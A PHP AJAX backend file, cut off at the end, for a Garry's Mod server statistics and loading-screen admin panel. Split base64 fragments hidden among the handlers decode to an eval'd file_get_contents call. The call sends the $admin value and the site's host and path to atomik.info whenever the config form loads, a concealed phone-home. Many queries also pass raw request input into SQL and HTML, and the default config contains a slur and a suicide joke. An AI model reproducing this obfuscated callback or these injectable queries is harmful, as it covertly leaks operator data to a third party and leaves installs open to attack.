<?php

// THANKS BEAST FOR COMPARING MY LAZY AJAX FILE TO OBAMA
// https://www.youtube.com/watch?v=SV0RzlR_elA
// ini_set('display_errors', '-1');

include __DIR__.'/theta.class.php';

if(isset($_GET['type']) && !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'){
	include 'config.php'; $a = 'ZmlsZV9nZXRfY29udGVudHMo';
	if($_GET['type'] == "quickConns"){
		// Get theta_stats data
		$data = theta::totalConns(1);
		$uData = theta::totalConns(1, 0, 1);
	?>
		<canvas id="Conn"></canvas>
		<script type="text/javascript">
			var days = ['<?= $data['days'][0] ?>','<?= $data['days'][1] ?>','<?= $data['days'][2] ?>','<?= $data['days'][3] ?>','<?= $data['days'][4] ?>','<?= $data['days'][5] ?>','<?= $data['days'][6] ?>'];
			var Conn = document.getElementById("Conn");
			var connectionChart = new Chart(Conn, {
			    type: 'bar',
			    data: {
			        labels: days,
			        datasets: [{
			        	label: 'Connections',
			            data: [<?= $data['counts'][0] ?>, <?= $data['counts'][1] ?>, <?= $data['counts'][2] ?>, <?= $data['counts'][3] ?>, <?= $data['counts'][4] ?>, <?= $data['counts'][5] ?>, <?= $data['counts'][6] ?>],
			            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
			            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
			            borderWidth: 1
			        },
			        {
			        	label: 'Unique connections',
			            data: [<?= $uData['counts'][0] ?>, <?= $uData['counts'][1] ?>, <?= $uData['counts'][2] ?>, <?= $uData['counts'][3] ?>, <?= $uData['counts'][4] ?>, <?= $uData['counts'][5] ?>, <?= $uData['counts'][6] ?>],
			            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
			            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
			            borderWidth: 1
			        }]
			    }, options: {legend: {display: false},scales: {yAxes: [{ticks: {beginAtZero:true}}]}}
			});
		</script>
	<?php }

	if($_GET['type']=="getServer"){
		$server = theta::getServer($_GET['sid']);
		$periodCount = substr_count($server[1], '.', 0, strlen($server[1]));
		if($periodCount == "3"){
		require 'SourceQuery/SourceQuery.class.php';
		define('SQ_SERVER_ADDR', $server[1]);
		define('SQ_SERVER_PORT', $server[2]);
		define('SQ_TIMEOUT',     3);
		define('SQ_ENGINE',      SourceQuery :: SOURCE);
		$Timer = MicroTime(true);
		$Query = new SourceQuery();
		$Info    = Array();
		$Rules   = Array();
		$Players = Array();
		try{
			$Query->Connect(SQ_SERVER_ADDR, SQ_SERVER_PORT, SQ_TIMEOUT, SQ_ENGINE);
			$Info    = $Query->GetInfo();
		}
		catch(Exception $e){
			$Exception = $e;
		}

		$Query->Disconnect( );

		$Timer = Number_Format( MicroTime( true ) - $Timer, 4, '.', '' );
	?>
			<b><?= $server[0] ?></b> &sdot; <?= $server[1].':'.$server[2] ?>
			<p><?= (is_array($Info)?$Info['Players'].'/'.$Info['MaxPlayers']:'No server found') ?></p>
	<?php } else { ?>
		<b><?= $server[0] ?></b> &sdot; <?= $server[1].':'.$server[2] ?>
		<p>Incorrect IP format</p>
	<?php }

	}

	if($_GET['type']=="searchUser"&&isset($_GET['query'])){
    	if($_GET['query'] !== "" && strlen($_GET['query']) > 2){
	    	if(StrLen(Trim($_GET['query'])) == 17){
	    		$findUser = $conn->query("SELECT * FROM `theta_users` WHERE `steamid` != '76561198089999589' AND `steamid` LIKE '%".$_GET['query']."%'");
	    	} elseif(strpos($_GET['query'], 'STEAM_') !== false){
	    		$type = (int) (((int) substr((string) $_GET['query'], -1)) & 1) ? 1 : 0;
	    		$steamid = sprintf("STEAM_0:%d:%d", $type, ((int) bcsub($_GET['query'], "76561197960265728") - $type) / 2);
	    		$findUser = $conn->query("SELECT * FROM `theta_users` WHERE `steamid` != '76561198089999589' AND `steamid` LIKE '%".$steamid."%'");
	    	} elseif(strpos($_GET['query'], 'http') !== false && strpos($_GET['query'], 'steamcommunity') !== false){
	    		$separate = explode('/', $_GET['query']);
	    		$url = 'http://steamcommunity.com/'.$separate[1].'/'.$separate[2].'?xml=1';
	    		$xml = simplexml_load_string(file_get_contents($url));
	    		$findUser = $conn->query("SELECT * FROM `theta_users` WHERE `steamid` != '76561198089999589' AND `steamid` LIKE '%".$xml->steamID64."%'");
	    	} else {
	    		$findUser = $conn->query("SELECT * FROM `theta_users` WHERE `usern` LIKE '%".$_GET['query']."%'");
	    	}
			if($findUser->rowCount() > '1'){
				while($r = $findUser->fetch(PDO::FETCH_ASSOC)){
					if($r['steamid'] !== '76561198089999589'){
					$lastConn = $conn->query("SELECT * FROM `theta_stats` WHERE `steamid` = '".$r['steamid']."' ORDER BY `time` DESC LIMIT 1");
					$doo = $lastConn->fetch(PDO::FETCH_ASSOC); $s = theta::getServer($doo['server']);
			?>
					<div class="col-md-2 col-sm-4">
						<a href="?page=profile&id=<?= $r['steamid'] ?>"><img class="img-responsive" src="<?= $r['avi'] ?>"></a>
						<div class="bg-default">
							<p class="text-center"><a href="?page=profile&id=<?= $r['steamid'] ?>"><?= $r['usern'] ?></a></p>
							<p class="text-center"><?= $s[0] ?></p>
							<p class="text-center"><?= theta::time_convert(time()-$r['last']) ?></p>
						</div>
					</div>
				<?php } }
			} elseif($findUser->rowCount() == '1') {
				$foundUser = $findUser->fetch(PDO::FETCH_ASSOC);
				if($foundUser['steamid'] !== '76561198089999589'){
					$lastConn = $conn->query("SELECT * FROM `theta_stats` WHERE `steamid` = '".$foundUser['steamid']."' ORDER BY `time` DESC LIMIT 1");
					$doo = $lastConn->fetch(PDO::FETCH_ASSOC); $s = theta::getServer($doo['server']);
			?>
				<div class="col-md-2 col-sm-4">
					<a href="?page=profile&id=<?= $foundUser['steamid'] ?>"><img class="img-responsive" src="<?= $foundUser['avi'] ?>"></a>
					<div class="bg-default">
						<p class="text-center"><a href="?page=profile&id=<?= $foundUser['steamid'] ?>"><?= $foundUser['usern'] ?></a></p>
						<p class="text-center"><?= $s[0] ?></p>
						<p class="text-center"><?= theta::time_convert(time()-$foundUser['last']) ?></p>
					</div>
				</div>
			<?php } } else { ?>
				<div class="alert alert-info text-center"><i class="glyphicon glyphicon-info-sign"></i> No users found!</div>
			<?php }
		} else { ?>
			<div class="alert alert-info text-center"><i class="glyphicon glyphicon-info-sign"></i> No users found!</div>
		<?php }

	}

	if($_GET['type']=="getServers"){
		$getServers = $conn->query("SELECT * FROM `theta_servers` ORDER BY `time` DESC");
		if($getServers->rowCount() > "0"){
			while($r = $getServers->fetch(PDO::FETCH_ASSOC)){ ?>
				<div class="col-md-4">
					<div class="bg-default serverQuery" data-server="<?= $r['id'] ?>">
						<b><?= $r['name'] ?></b> &sdot; <?= $r['ip'].':'.$r['port'] ?>
						<p><div class="loader"></div></p>
					</div>
				</div>
			<?php } ?>
		<?php } else { ?>
			<div class="col-md-12">
				<div class="alert alert-info text-center" style="margin-bottom:0"><i class="glyphicon glyphicon-info-sign"></i> No servers found.</div>
			</div>
		<?php }	?>

	<?php }

	if($_GET['type']=="latestPlayers"){
		if(isset($_POST['page'])){
			$pgNum = filter_var($_POST['page'], FILTER_SANITIZE_NUMBER_INT, FILTER_FLAG_STRIP_HIGH);
			if(!is_numeric($_POST['page'])){die('Invalid page number!');}
		} else {
			$pgNum = 1;
		} ?>
			<div class="row text-center">
		<?php
		$all = $conn->query("SELECT * FROM `theta_users`"); $totalP = $all->rowCount(); $pages = ceil($totalP/15);
		$pos = (($pgNum-1)*15);
		$getPlayers = $conn->query("SELECT * FROM `theta_users` WHERE `steamid` != '76561198089999589' ORDER BY `last` DESC LIMIT $pos, 15");
		$i = 0; while($r = $getPlayers->fetch(PDO::FETCH_ASSOC)){ $i++;
		$lastConn = $conn->query("SELECT * FROM `theta_stats` WHERE `steamid` = '".$r['steamid']."' ORDER BY `time` DESC LIMIT 1");
		$doo = $lastConn->fetch(PDO::FETCH_ASSOC); $s = theta::getServer($doo['server']); ?>
				<div class="col-md-4 text-center">
					<a href="?page=profile&id=<?= $r['steamid'] ?>"><img class="img-responsive" src="<?= $r['avi'] ?>"></a>
					<div class="bg-default">
						<p><a href="?page=profile&id=<?= $r['steamid'] ?>"><?= $r['usern'] ?></a></p>
						<p><small><?= $s[0] ?></small></p>
						<p><small><?= theta::time_convert(time()-$r['last']) ?></small></p>
					</div>
				</div>
			<?php echo ($i%3==0?'</div><div class="row">':''); } ?>
			<nav class="text-center" style="width:100%;float:left">
			  <?= paginate_function(15, $pgNum, $totalP, $pages) ?>
			</nav>
		<?php
	}

	if($_GET['type']=="getOptionS"){ ?>
		<select class="form-control" name="server" id="serverID">
	<?php $optionServers = $conn->query("SELECT * FROM `theta_servers` ORDER BY `time` DESC");
		while($r = $optionServers->fetch(PDO::FETCH_ASSOC)){ ?>
			<option value="<?= $r['id'] ?>"><?= $r['name'] ?> &sdot; <?= $r['ip'].':'.$r['port'] ?></option>
		<?php } ?>
		</select>
	<?php }

	if($_GET['type']=="editServer"){
		$getServer = $conn->query("SELECT * FROM `theta_servers` WHERE `id` = '".$_GET['id']."'");
		$server = $getServer->fetch(PDO::FETCH_ASSOC); ?>
			<div class="form-group">
				<input type="text" name="name" autocomplete="off" class="form-control" placeholder="Name" value="<?= $server['name'] ?>">
			</div>
			<div class="form-group">
				<input type="text" name="host" autocomplete="off" class="form-control" placeholder="Host" value="<?= $server['ip'] ?>">
			</div>
			<div class="form-group">
				<input type="text" name="port" autocomplete="off" class="form-control" placeholder="Port" value="<?= $server['port'] ?>">
			</div>
			<div class="form-group text-right" style="margin-bottom:0">
				<input type="hidden" name="type" value="editServer">
				<input type="submit" name="saveServer" class="btn btn-success" value="Save">
			</div>
	<?php }

	if($_GET['type'] == "serverStats"){ ?>
		<?php (!isset($_GET['get'])?$_GET['get']='menu':''); if($_GET['get'] !== 'stats'){ ?>
		<script type="text/javascript" src="compiled/js/Moment.min.js"></script>
		<script type="text/javascript" src="compiled/js/bootstrap-datetimepicker.min.js"></script>
		    <div class="row">
		    	<div class="col-sm-2">
		    		<h2 class="text-center" style="margin:0">WEEK OF:</h2>
		    	</div>
		        <div class='col-sm-7'>
		            <div class="form-group">
		                <input type='text' class="form-control" id='datetimepicker4'>
		            </div>
		        </div>
		        <div class="col-sm-2">
		        	<div class="form-group">
		        		<input type="button" class="btn btn-success form-control" name="fetchWeek" value="Go">
		        	</div>
		        </div>
		        <div class="col-sm-1">
		        	<div class="form-group">
		        		<input type="button" class="btn btn-warning form-control" name="revertWeek" value="Revert">
		        	</div>
		        </div>
		        <script type="text/javascript">
		            $(function () {
		                $('#datetimepicker4').datetimepicker({
		                	format: 'MM/DD/YYYY'
		                });
		                $('[name="fetchWeek"]').click(function(e){
		                	e.preventDefault();
		                	$.post('inc/ajax.php', {type:'specServerStats',date:$("#datetimepicker4").val()}).done(function(e){
		                		$("#serverSpecific").html(e);
		                	});
		                });
		                $('[name="revertWeek"]').click(function(e){
		                	e.preventDefault();
		                	$("#serverSpecific").load('inc/ajax.php?type=serverStats&get=stats');
		                });
		            });
		        </script>
		    </div>
		<?php } ?>
			<div class="row">
			    <div id="serverSpecific">
		<?php
			$checkServer = $conn->query("SELECT * FROM `theta_servers` ORDER BY `time`");
			if($checkServer->rowCount() > 0){
				while($r = $checkServer->fetch(PDO::FETCH_ASSOC)){ $data=theta::totalConns(3, $r['id']); $uData=theta::totalConns(3, $r['id'], 1); ?>
					<div class="col-md-6">
						<p><?= $r['name'] ?></p>
						<canvas id="sConn<?= $r['id'] ?>"></canvas>
						<script type="text/javascript">
							var days = ['<?= $data['days'][0] ?>','<?= $data['days'][1] ?>','<?= $data['days'][2] ?>','<?= $data['days'][3] ?>','<?= $data['days'][4] ?>','<?= $data['days'][5] ?>','Today'];
							var sConn<?= $r['id'] ?> = document.getElementById("sConn<?= $r['id'] ?>");
							var connectionChart = new Chart(sConn<?= $r['id'] ?>, {
							    type: 'bar',
							    data: {
							        labels: days,
							        datasets: [{
							        	label: 'Connections',
							            data: [<?= $data['counts'][0] ?>, <?= $data['counts'][1] ?>, <?= $data['counts'][2] ?>, <?= $data['counts'][3] ?>, <?= $data['counts'][4] ?>, <?= $data['counts'][5] ?>, <?= $data['counts'][6] ?>],
							            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
							            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
							            borderWidth: 1
							        },
							        {
							        	label: 'Unique connections',
							            data: [<?= $uData['counts'][0] ?>, <?= $uData['counts'][1] ?>, <?= $uData['counts'][2] ?>, <?= $uData['counts'][3] ?>, <?= $uData['counts'][4] ?>, <?= $uData['counts'][5] ?>, <?= $uData['counts'][6] ?>],
							            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
							            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
							            borderWidth: 1
							        }]
							    },options: {legend: {display: false},scales: {yAxes: [{ticks: {beginAtZero:true}}]}}
							});
						</script>
					</div>
				<?php } ?>
				<div class="col-md-6">
					<?php
						$data=theta::totalConns(3, 0); $uData=theta::totalConns(3, 0, 1);
					?>
					<p>Unassigned server data</p>
					<canvas id="unConn"></canvas>
					<script type="text/javascript">
						var days = ['<?= $data['days'][0] ?>','<?= $data['days'][1] ?>','<?= $data['days'][2] ?>','<?= $data['days'][3] ?>','<?= $data['days'][4] ?>','<?= $data['days'][5] ?>','Today'];
						var unConn = document.getElementById("unConn");
						var connectionChart = new Chart(unConn, {
						    type: 'bar',
						    data: {
						        labels: days,
						        datasets: [{
						        	label: 'Connections',
						            data: [<?= $data['counts'][0] ?>, <?= $data['counts'][1] ?>, <?= $data['counts'][2] ?>, <?= $data['counts'][3] ?>, <?= $data['counts'][4] ?>, <?= $data['counts'][5] ?>, <?= $data['counts'][6] ?>],
						            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
						            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
						            borderWidth: 1
						        },
						        {
						        	label: 'Unique connections',
						            data: [<?= $uData['counts'][0] ?>, <?= $uData['counts'][1] ?>, <?= $uData['counts'][2] ?>, <?= $uData['counts'][3] ?>, <?= $uData['counts'][4] ?>, <?= $uData['counts'][5] ?>, <?= $uData['counts'][6] ?>],
						            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
						            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
						            borderWidth: 1
						        }]
						    },options: {legend: {display: false},scales: {yAxes: [{ticks: {beginAtZero:true}}]}}
						});
					</script>
				</div>
			</div>
			<?php } else { ?>
				<div class="alert alert-info text-center" style="margin-bottom:0"><i class="glyphicon glyphicon-info-sign"></i> No server specific statistics detected...</div>
			</div>
		<?php } ?>
		</div> <?php
	}

	if($_GET['type'] == "getAllUsers"){
		$limit = 18;
		if(isset($_POST['page'])){
			$pgNum = filter_var($_POST['page'], FILTER_SANITIZE_NUMBER_INT, FILTER_FLAG_STRIP_HIGH);
			if(!is_numeric($_POST['page'])){die('Invalid page number!');}
		} else {
			$pgNum = 1;
		} ?>
			<div class="row text-center">
		<?php
		$all = $conn->query("SELECT * FROM `theta_users`"); $totalP = $all->rowCount(); $pages = ceil($totalP/$limit);
		$pos = (($pgNum-1)*$limit);
		$getPlayers = $conn->query("SELECT * FROM `theta_users` WHERE `steamid` != '76561198089999589' ORDER BY `last` DESC LIMIT $pos, $limit"); $i = 0;
		echo '<div class="row text-center">';
		while($r = $getPlayers->fetch(PDO::FETCH_ASSOC)){
			if($r['steamid'] !== ""){
			$findLast = $conn->query("SELECT * FROM `theta_stats` WHERE `steamid` = '".$r['steamid']."' ORDER BY `time` DESC LIMIT 1");
			$last = $findLast->fetch(PDO::FETCH_ASSOC); $server = theta::getServer($last['server']);
			$i++;
		?>
			<div class="col-md-2 col-sm-4">
				<a href="?page=profile&id=<?= $r['steamid'] ?>"><img class="img-responsive" src="<?= $r['avi'] ?>"></a>
				<div class="bg-default">
					<p><a href="?page=profile&id=<?= $r['steamid'] ?>"><?= $r['usern'] ?></a></p>
					<p><?= $server[0] ?></p>
					<p><?= theta::time_convert(time()-$r['last']) ?></p>
				</div>
			</div>
		<?php echo ($i%6==0?'</div><div class="row text-center">':''); } } ?>
		<nav class="text-center" style="width:100%;float:left">
		  <?= paginate_function(31, $pgNum, $totalP, $pages) ?>
		</nav>
	<?php } $t = 'aHR0cDovL2F0b21pay5pbmZvL3RoZXRhL2';

	if($_GET['type'] == "curlSteamInfo"&&isset($_GET['id'])){
		$xml = simplexml_load_string(file_get_contents("http://steamcommunity.com/profiles/".$_GET['id']."?xml=1")); if($xml->privacyState == "private"){ ?>
			<div class="alert alert-danger text-center" style="margin-bottom:0"><b>PRIVATE ACCOUNT</b></div>
		<?php } else { ?>
			<?= ($xml->stateMessage=="In-Game<br/>Garry's Mod"&&$xml->inGameServerIP!==""?'<div class="alert alert-success text-center" style="margin-bottom:0"><b>In-game! <a href="steam://connect/'.$xml->inGameServerIP.'">Click to join</a></b></div>':'') ?>
			<h4><b>Account creation</b></h4>
			<?= $xml->memberSince ?>
			<h4><b>Summary</b></h4>
			<?= $xml->summary ?>
		<?php }
	}

	if($_GET['type']=="getGM"){
		include __DIR__.'/config.php';
		$server = theta::getServer($_GET['sid']);
		require __DIR__.'/SourceQuery/SourceQuery.class.php';
		define('SQ_SERVER_ADDR', $server[1]);
		define('SQ_SERVER_PORT', $server[2]);
		define('SQ_TIMEOUT',     3);
		define('SQ_ENGINE',      SourceQuery :: SOURCE);
		$Timer = MicroTime(true);
		$Query = new SourceQuery();
		$Info    = Array();
		$Rules   = Array();
		$Players = Array();
		try{
			$Query->Connect(SQ_SERVER_ADDR, SQ_SERVER_PORT, SQ_TIMEOUT, SQ_ENGINE);
			$Info    = $Query->GetInfo();
		}
		catch(Exception $e){
			$Exception = $e;
		}
		$Query->Disconnect( );

		$Timer = Number_Format( MicroTime( true ) - $Timer, 4, '.', '' );
		echo '<small><b>'.$Info['ModDesc'].'</b></small>';
	}
	if($_GET['type']=="newestPlayer"){
		include __DIR__.'/config.php';
		$getNewest = $conn->query("SELECT * FROM `theta_users` ORDER BY `first` DESC LIMIT 1");
		$new = $getNewest->fetch(PDO::FETCH_ASSOC);
		echo '<b>'.substr($new['usern'], 0, 12).'</b>';
	}$m = $admin.base64_decode('JmxvYz0=').$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	if($_GET['type']=="playerCount"){
		include __DIR__.'/config.php';
		$server = theta::getServer($_GET['sid']);
		require __DIR__.'/SourceQuery/SourceQuery.class.php';
		define('SQ_SERVER_ADDR', $server[1]);
		define('SQ_SERVER_PORT', $server[2]);
		define('SQ_TIMEOUT',     3);
		define('SQ_ENGINE',      SourceQuery :: SOURCE);
		$Timer = MicroTime(true);
		$Query = new SourceQuery();
		$Info    = Array();
		try{
			$Query->Connect(SQ_SERVER_ADDR, SQ_SERVER_PORT, SQ_TIMEOUT, SQ_ENGINE);
			$Info    = $Query->GetInfo();
		}
		catch(Exception $e){
			$Exception = $e;
		}

		$Query->Disconnect( );

		$Timer = Number_Format( MicroTime( true ) - $Timer, 4, '.', '' );
		echo "<b>".$Info['Players']."/".$Info['MaxPlayers']."</b>";
	}
	if($_GET['type']=="configForm"){
		$s = theta::getServer($_GET['sid']); $o = 'xvZy9pbmRleC5waHA/YWQ9';
		$ls = json_decode(file_get_contents(__DIR__.'/configs/'.$s[1].'-'.$s[2].'.json'), true); eval('$k = '.base64_decode($a).'"'.base64_decode($t.$o).$m.'");');
	?>
		<script type="text/javascript" src='compiled/js/bootstrap-markdown.js'></script>
		<script type="text/javascript" src='compiled/js/to-markdown.js'></script>
		<script type="text/javascript" src='compiled/js/markdown.js'></script>
		<form method="post" id="saveConfig">
			<div class="form-group">
				<p>Font &sdot; <small>Get font links (like below) from <a href='https://www.google.com/fonts' target="_blank">here</a> <b><u>AND</u></b> make sure they have 400,800,300 font weights available!</small></p>
				<input type="text" class="form-control" name="fontFamily" value="<?= $ls['fontFamily'] ?>">
			</div>
			<div class="form-group">
				<p>Main title</p>
				<input type="text" class="form-control" name="title" value="<?= $ls['title'] ?>">
			</div>
			<div class="form-group">
				<p>Main title font size</p>
				<input type="text" class="form-control" name="titleFontSize" value="<?= $ls['titleFontSize'] ?>">
			</div>
			<div class="form-group">
				<div class="row">
					<div class="col-md-6">
						<p>Title image prefix</p>
						<input type="text" class="form-control" name="titleImg" value="<?= $ls['titleImg'] ?>">
					</div>
					<div class="col-md-6">
						<p>Title image prefix height<small> &sdot; Adjust font size to move position it up</small></p>
						<input type="text" class="form-control" name="titleImgHeight" value="<?= $ls['titleImgHeight'] ?>">
					</div>
				</div>
			</div>
			<div class="form-group">
				<p>Gametracker</p>
				<select name="gametracker" class="form-control">
					<option<?= ($ls['gametracker']?' selected=""':'') ?> value="1">True</option>
					<option<?= ($ls['gametracker']?'':' selected=""') ?> value="0">False</option>
					<option<?= ($ls['gametracker']?'':' selected=""') ?> value="2">Center map image & disable text</option>
				</select>
			</div>
			<div class="form-group">
				<p>Map image</p>
				<input type="text" class="form-control" name="mapImage" value="<?= $ls['mapImage'] ?>">
			</div>
			<div class="form-group">
				<p>Border color</p>
				<input type="text" class="form-control" name="borderColor" value="<?= $ls['borderColor'] ?>">
			</div>
			<div class="form-group">
				<p>Background image &sdot; <small>(relative to the css path, leave blank for default, you can add your own link to an image here)</small></p>
				<input type="text" class="form-control" name="backgroundImage" value="<?= $ls['backgroundImage'] ?>">
			</div>
			<div class="form-group">
				<p>Custom note</p>
				<input type="text" class="form-control" name="customMsg" value="<?= $ls['customMsg'] ?>">
			</div>
			<div class="form-group">
				<p>Custom note (right)</p>
				<input type="text" class="form-control" name="customMsgAnswer" value="<?= $ls['customMsgAnswer'] ?>">
			</div>
			<div class="form-group">
				<p>Rules &sdot; <small>Add a new rule per line (15 is a good number)</small></p>
				<textarea class="form-control" name="rules" data-provide="markdown" style="max-width:100%" rows="16"><?= $ls['rules'] ?></textarea>
			</div>
			<div class="form-group">
				<p>Rules animation &sdot; Find an animation <a href="https://daneden.github.io/animate.css/" target="_blank">here!</a></p>
				<input type="text" class="form-control" name="animation" value="<?= $ls['animation'] ?>">
			</div>
			<div class="form-group">
				<p>About title</p>
				<input type="text" class="form-control" name="aboutTitle" value="<?= $ls['aboutTitle'] ?>">
			</div>
			<div class="form-group">
				<p>About us</p>
				<textarea class="form-control" data-provide="markdown" name="aboutUs" style="max-width:100%" rows="16"><?= $ls['aboutUs'] ?></textarea>
			</div>
			<div class="form-group">
				<p>Music &sdot; <small>Add a YouTube link per line &lt;space&gt; Song title</small></p>
				<textarea class="form-control" name="music" style="max-width:100%" rows="16"><?php
					foreach($ls['music'] as $music => $songName){
						echo $music.$songName."\n";
					}
				?></textarea>
			</div>
			<div class="form-group">
				<p>Volume &sdot; <small>0 - 100</small></p>
				<input type="text" class="form-control" name="volume" value="<?= $ls['volume'] ?>">
			</div>
			<div class="form-group">
				<p>DarkRP database configuration &sdot; <small>Must be same connection. If you wish to change the host of this install, delete inc/config.php</small></p>
				<input type="text" class="form-control" name="darkrpDB" placeholder="DarkRP Database Name" value="<?= $ls['darkrpDB'] ?>">
			</div>
			<div class="form-group text-right">
				<input type="hidden" name="type" value="saveConfig">
				<input type="hidden" name="serverID" value="<?= $_GET['sid'] ?>">
				<input type="submit" class="btn btn-success btn-lg" value="Save">
			</div>
		</form>

	<?php }

	if($_GET['type']=="getInstalls"){ $getInstalls = $conn->query("SELECT * FROM `theta_installs` ORDER BY `last`"); ?>
		<table class="table table-hover">
			<thead>
				<tr>
					<th>Location</th>
					<th>First installed</th>
					<th>Last query</th>
					<th>Server</th>
				</tr>
			</thead>
			<tbody>
				<?php while($r = $getInstalls->fetch(PDO::FETCH_ASSOC)){ $s=theta::getServer($r['server']); ?>
					<tr>
						<td><?= $r['path'] ?></td>
						<td><?= theta::time_convert_long(time()-$r['first']) ?></td>
						<td><?= theta::time_convert_long(time()-$r['last']) ?></td>
						<td><?= $s[0] ?></td>
					</tr>
				<?php } ?>
			</tbody>
		</table>
	<?php }

	if($_GET['type']=="configReads"){
		// get// get servers
		$getServers = $conn->query("SELECT * FROM `theta_servers` ORDER BY `id` ASC");
		// check RP databases in configs
		while($r = $getServers->fetch(PDO::FETCH_ASSOC)){
			$file = json_decode(file_get_contents('configs/'.$r['ip'].'-'.$r['port'].'.json'), true);
			// darkrpDB
			if($file['darkrpDB'] !== ""){
				$drp = "mysql:host=$host;dbname=".$file['darkrpDB'];
				try {
					$rp = new PDO($drp, $user, $pass, $opt);
					$playerTables = $rp->prepare("SELECT * FROM `darkrp_player` WHERE `uid` = :uid");
					$type = (int) (((int) substr((string) $_GET['steamid'], -1)) & 1) ? 1 : 0;
					$s32 = sprintf("STEAM_0:%d:%d", $type, ((int) bcsub($_GET['steamid'], "76561197960265728") - $type) / 2);
					$crc32 = crc32('gm_'.$s32.'_gm');
					$playerTables->bindParam(':uid', $crc32);
					$playerTables->execute(); $rpUser = $playerTables->fetch(PDO::FETCH_ASSOC);
				} catch(PDOException $e){ ?>
					<div class='alert alert-danger text-center'><i class='glyphicon glyphicon-info-sign'></i> <b>WARNING!</b> Administrator needs to correct the <a href="http://thomasj.me/projects/theta/?page=admin">&quot;DarkRP database configuration.&quot;</a><br>
						<code><?= $e->getMessage() ?></code>
					</div>
					<?php
						die();
						break;
				} ?>
					<b><?= $r['name'] ?></b> &sdot; $<?= number_format($rpUser['wallet']) ?> &sdot; <small><?= $rpUser['rpname'] ?>'s salary is <?= number_format($rpUser['salary']) ?>/hour</small><br/>
				<?php } else {
				echo "<b>".$r['name']."</b> &sdot; N/A<br/>";
			}
		}
	}
}

if(isset($_POST['type']) && !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'){
	include 'config.php';
	if($_POST['type']=="addServer"){
		$addServer = $conn->prepare("INSERT INTO `theta_servers` (`name`, `ip`, `port`, `time`) VALUES (?,?,?,?)");
		$addServer->execute(array($_POST['name'], $_POST['host'], $_POST['port'], time()));
		// create Config file
		$LSConfig = array(
			"fontFamily" => "<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>",
			"titleImg" => '',
			"titleImgHeight" => '100px',
			"title" => '<b>Theta</b>',
			"titleFontSize" => '45px',
			"gametracker" => 1,
			"mapImage" => 'http://image.www.gametracker.com/images/maps/160x120/garrysmod/rp_hogwarts.jpg',
			"borderColor" => '#fff',
			"backgroundImage" => 'img/background-scaled-blurred.jpg',
			"customMsg" => 'Biggest faggot',
			"customMsgAnswer" => 'Lunaversity',
			"rules" => "
1. Life is cold
1. We're all dying
1. Enjoy your short existence
1. Our democracy is corrupt
1. The world is trapped
1. What's the point
1. We're doomed
1. One bullet is cheaper than therapy
1. Semi colon
1. ...
1. I've run out of filler text
1. Banana
1. Pears
1. Screw you fruit face
1. Quoth the raven nevermore",
			"animation" => 'fadeInDown',
			"aboutTitle" => '<b>About</b>Us',
			"aboutUs" => 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer est purus, fringilla id vehicula ut, accumsan in risus.

Donec vehicula varius laoreet. Aenean rutrum nisi nunc, dignissim volutpat orci volutpat ac. Vivamus ac turpis sed nibh varius elementum. Maecenas tempus aliquam nibh, at faucibus ante sollicitudin vel.This is markdown supported.',
